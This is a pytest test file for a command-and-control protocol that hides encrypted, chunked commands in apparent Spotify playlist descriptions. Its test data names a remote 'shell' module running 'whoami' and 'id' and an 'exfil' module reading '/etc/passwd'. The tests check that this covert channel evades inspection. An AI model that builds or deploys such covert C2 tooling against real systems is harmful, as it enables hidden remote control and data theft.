"""Tests for c2_protocol.py - C2 message serialization and chunking."""

import pytest

from c2_protocol import (
    C2Message, CHANNEL_CMD, CHANNEL_RES,
    C2_EFFECTIVE_CHUNK, C2_TAG_LEN,
    compute_c2_tag, _encrypt_chunk_desc, _decrypt_chunk_desc,
    encode_message, decode_message,
    chunk_payload, reassemble_payload, read_c2_descriptions,
)

TEST_KEY = "test-c2-key-2026"


# --- C2Message Tests ---

class TestC2Message:
    def test_command_roundtrip(self):
        """Command dict serialization/deserialization."""
        msg = C2Message(module="shell", seq=1, args={"cmd": "whoami"})
        d = msg.to_command_dict()
        restored = C2Message.from_command_dict(d)
        assert restored.module == "shell"
        assert restored.seq == 1
        assert restored.args == {"cmd": "whoami"}

    def test_result_roundtrip(self):
        """Result dict serialization/deserialization."""
        msg = C2Message(
            module="shell", seq=1,
            status="ok", data="root\n"
        )
        d = msg.to_result_dict()
        restored = C2Message.from_result_dict(d)
        assert restored.module == "shell"
        assert restored.seq == 1
        assert restored.status == "ok"
        assert restored.data == "root\n"

    def test_command_dict_has_required_fields(self):
        """Command dict contains module, args, seq, ts."""
        msg = C2Message(module="exfil", seq=5,
                        args={"path": "/etc/passwd"})
        d = msg.to_command_dict()
        assert set(d.keys()) == {"module", "args", "seq", "ts"}

    def test_result_dict_has_required_fields(self):
        """Result dict contains seq, module, status, data, ts."""
        msg = C2Message(
            module="sysinfo", seq=3,
            status="ok", data='{"os":"Linux"}'
        )
        d = msg.to_result_dict()
        assert set(d.keys()) == {"seq", "module", "status", "data", "ts"}

    def test_default_args_empty(self):
        """Default args is empty dict."""
        msg = C2Message(module="sysinfo", seq=1)
        assert msg.args == {}

    def test_timestamp_set(self):
        """Timestamp is auto-set."""
        msg = C2Message(module="shell", seq=1)
        assert msg.ts > 0


# --- C2 Tag Tests ---

class TestC2Tag:
    def test_tag_length(self):
        """Tag is exactly C2_TAG_LEN hex chars."""
        tag = compute_c2_tag(TEST_KEY)
        assert len(tag) == C2_TAG_LEN

    def test_tag_deterministic(self):
        """Same key produces same tag."""
        assert compute_c2_tag("key") == compute_c2_tag("key")

    def test_tag_different_keys(self):
        """Different keys produce different tags."""
        assert compute_c2_tag("key1") != compute_c2_tag("key2")

    def test_tag_is_hex(self):
        """Tag is valid hex string."""
        tag = compute_c2_tag(TEST_KEY)
        int(tag, 16)  # Should not raise


# --- Encrypted Chunk Description Tests ---

class TestChunkDescEncryption:
    def test_roundtrip(self):
        """Encrypt then decrypt recovers metadata and data."""
        meta = {"c": "cmd", "i": 1, "seq": 5}
        data = "base64encodeddata"
        desc = _encrypt_chunk_desc(meta, data, TEST_KEY)
        recovered_meta, recovered_data = _decrypt_chunk_desc(
            desc, TEST_KEY
        )
        assert recovered_meta == meta
        assert recovered_data == data

    def test_starts_with_tag(self):
        """Encrypted description starts with C2 tag."""
        meta = {"c": "cmd", "i": 1, "seq": 1}
        desc = _encrypt_chunk_desc(meta, "data", TEST_KEY)
        tag = compute_c2_tag(TEST_KEY)
        assert desc.startswith(tag)

    def test_no_plaintext_metadata(self):
        """Description doesn't contain plaintext metadata."""
        meta = {"c": "cmd", "i": 1, "seq": 42}
        desc = _encrypt_chunk_desc(meta, "data", TEST_KEY)
        assert '"cmd"' not in desc
        assert '"seq"' not in desc
        assert '"42"' not in desc

    def test_wrong_key_fails(self):
        """Decryption with wrong key raises."""
        meta = {"c": "cmd", "i": 1, "seq": 1}
        desc = _encrypt_chunk_desc(meta, "data", TEST_KEY)
        with pytest.raises(ValueError, match="tag mismatch"):
            _decrypt_chunk_desc(desc, "wrong-key")

    def test_different_each_time(self):
        """Each encryption produces different output (random nonce)."""
        meta = {"c": "cmd", "i": 1, "seq": 1}
        d1 = _encrypt_chunk_desc(meta, "data", TEST_KEY)
        d2 = _encrypt_chunk_desc(meta, "data", TEST_KEY)
        assert d1 != d2


# --- Encode/Decode Message Tests ---

class TestEncodeDecodeMessage:
    def test_roundtrip(self):
        """Encode then decode recovers original dict."""
        original = {"module": "shell", "args": {"cmd": "id"}, "seq": 1}
        encoded = encode_message(original, TEST_KEY)
        decoded = decode_message(encoded, TEST_KEY)
        assert decoded["module"] == "shell"
        assert decoded["args"]["cmd"] == "id"
        assert decoded["seq"] == 1

    def test_encrypted_output_differs(self):
        """Each encoding produces different output (random nonce)."""
        msg = {"module": "shell", "seq": 1}
        enc1 = encode_message(msg, TEST_KEY)
        enc2 = encode_message(msg, TEST_KEY)
        assert enc1 != enc2

    def test_wrong_key_fails(self):
        """Decoding with wrong key raises exception."""
        msg = {"module": "shell", "seq": 1}
        encoded = encode_message(msg, "correct-key")
        with pytest.raises(Exception):
            decode_message(encoded, "wrong-key")

    def test_integrity_verification(self):
        """Tampered payload fails integrity check."""
        msg = {"module": "shell", "seq": 1}
        encoded = encode_message(msg, TEST_KEY)
        tampered = encoded[:-4] + "XXXX"
        with pytest.raises(Exception):
            decode_message(tampered, TEST_KEY)

    def test_unicode_data(self):
        """Unicode content survives encode/decode."""
        msg = {"module": "shell", "seq": 1,
               "data": "H\u00ebllo w\u00f6rld"}
        encoded = encode_message(msg, TEST_KEY)
        decoded = decode_message(encoded, TEST_KEY)
        assert decoded["data"] == "H\u00ebllo w\u00f6rld"

    def test_large_data(self):
        """Large data payloads encode/decode correctly."""
        msg = {"module": "exfil", "seq": 1, "data": "A" * 10000}
        encoded = encode_message(msg, TEST_KEY)
        decoded = decode_message(encoded, TEST_KEY)
        assert decoded["data"] == "A" * 10000


# --- Chunking Tests ---

class TestChunkPayload:
    def test_small_payload_single_chunk(self):
        """Small payload fits in one chunk."""
        descs = chunk_payload(
            "shortdata", seq=1,
            channel=CHANNEL_CMD, encryption_key=TEST_KEY,
        )
        assert len(descs) == 1
        # Verify it's encrypted (starts with tag, no plaintext meta)
        tag = compute_c2_tag(TEST_KEY)
        assert descs[0].startswith(tag)
        assert '"cmd"' not in descs[0]

    def test_large_payload_multi_chunk(self):
        """Large payload splits into multiple chunks."""
        payload = "X" * (C2_EFFECTIVE_CHUNK * 3 + 50)
        descs = chunk_payload(
            payload, seq=5,
            channel=CHANNEL_RES, encryption_key=TEST_KEY,
        )
        assert len(descs) == 4

    def test_descriptions_fit_chunk_size(self):
        """Each description fits within CHUNK_SIZE."""
        from spotapi import CHUNK_SIZE
        payload = "Y" * (C2_EFFECTIVE_CHUNK * 2 + 10)
        descs = chunk_payload(
            payload, seq=999,
            channel=CHANNEL_RES, encryption_key=TEST_KEY,
        )
        for desc in descs:
            assert len(desc) <= CHUNK_SIZE

    def test_all_encrypted(self):
        """No description contains plaintext metadata."""
        descs = chunk_payload(
            "data", seq=42,
            channel=CHANNEL_CMD, encryption_key=TEST_KEY,
        )
        for desc in descs:
            assert '"cmd"' not in desc
            assert '"seq"' not in desc
            assert '"42"' not in desc


# --- Read C2 Descriptions Tests ---

class TestReadC2Descriptions:
    def test_filters_by_channel(self):
        """Only matching channel descriptions are returned."""
        descs_cmd = chunk_payload(
            "cmd_data", 1, CHANNEL_CMD, TEST_KEY
        )
        descs_res = chunk_payload(
            "res_data", 2, CHANNEL_RES, TEST_KEY
        )
        all_descs = [
            ("pl1", descs_cmd[0]),
            ("pl2", descs_res[0]),
        ]
        result = read_c2_descriptions(
            all_descs, TEST_KEY, channel=CHANNEL_CMD
        )
        assert 1 in result
        assert 2 not in result

    def test_filters_by_seq(self):
        """Only matching seq descriptions are returned."""
        d1 = chunk_payload("data1", 1, CHANNEL_CMD, TEST_KEY)
        d2 = chunk_payload("data2", 2, CHANNEL_CMD, TEST_KEY)
        all_descs = [("pl1", d1[0]), ("pl2", d2[0])]
        result = read_c2_descriptions(
            all_descs, TEST_KEY,
            channel=CHANNEL_CMD, seq=2,
        )
        assert 2 in result
        assert 1 not in result

    def test_skips_non_c2_playlists(self):
        """Non-C2 playlists are silently skipped."""
        c2_desc = chunk_payload("data", 1, CHANNEL_CMD, TEST_KEY)
        all_descs = [
            ("pl1", "just a normal playlist description"),
            ("pl2", c2_desc[0]),
        ]
        result = read_c2_descriptions(
            all_descs, TEST_KEY, channel=CHANNEL_CMD
        )
        assert 1 in result

    def test_wrong_key_skips_all(self):
        """Wrong key can't read any C2 playlists."""
        c2_desc = chunk_payload("data", 1, CHANNEL_CMD, TEST_KEY)
        all_descs = [("pl1", c2_desc[0])]
        result = read_c2_descriptions(
            all_descs, "wrong-key", channel=CHANNEL_CMD
        )
        assert len(result) == 0


# --- Reassembly Tests ---

class TestReassemblePayload:
    def test_single_chunk(self):
        """Single chunk reassembles correctly."""
        chunk_metas = [("hello", {"c": "cmd", "i": 1, "seq": 1})]
        result = reassemble_payload(chunk_metas)
        assert result == "hello"

    def test_ordered_chunks(self):
        """Multiple chunks in order reassemble correctly."""
        chunk_metas = [
            ("AAA", {"i": 1}),
            ("BBB", {"i": 2}),
            ("CCC", {"i": 3}),
        ]
        result = reassemble_payload(chunk_metas)
        assert result == "AAABBBCCC"

    def test_unordered_chunks(self):
        """Out-of-order chunks are sorted by index."""
        chunk_metas = [
            ("CCC", {"i": 3}),
            ("AAA", {"i": 1}),
            ("BBB", {"i": 2}),
        ]
        result = reassemble_payload(chunk_metas)
        assert result == "AAABBBCCC"

    def test_full_encrypt_chunk_reassemble_roundtrip(self):
        """chunk_payload + read_c2_descriptions + reassemble roundtrip."""
        original = "X" * 2000
        descs = chunk_payload(
            original, seq=1,
            channel=CHANNEL_CMD, encryption_key=TEST_KEY,
        )
        desc_pairs = [
            (f"pl{i}", d) for i, d in enumerate(descs)
        ]
        seq_groups = read_c2_descriptions(
            desc_pairs, TEST_KEY, channel=CHANNEL_CMD
        )
        result = reassemble_payload(seq_groups[1])
        assert result == original
